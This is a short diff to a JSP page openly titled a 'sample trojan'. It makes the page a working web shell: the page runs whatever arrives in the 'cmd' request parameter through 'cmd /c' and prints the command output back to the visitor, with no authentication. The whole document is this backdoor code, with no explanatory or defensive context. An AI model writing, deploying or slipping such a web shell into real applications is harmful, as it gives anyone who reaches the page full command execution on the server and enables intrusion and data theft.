@@ -1,9 +1,11 @@
-<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
-    pageEncoding="ISO-8859-1"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%>
+<%@ page import="java.io.*"%>
+
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="ISO-8859-1">
+<meta charset="UTF-8">
 <title>JSP版示例木马</title>
 </head>
 <body>
@@ -12,13 +14,13 @@
 <% 
 String cmd = request.getParameter("cmd");
 
-Runtime.getRuntime().exec("cmd "+cmd);
-
-String result = cmd;
+Process process = Runtime.getRuntime().exec("cmd /c "+cmd);
+String result = new String(process.getInputStream().readAllBytes());
 %>
 
-
+<pre>
 <%=result %>
+</pre>
 
 </body>
 </html>
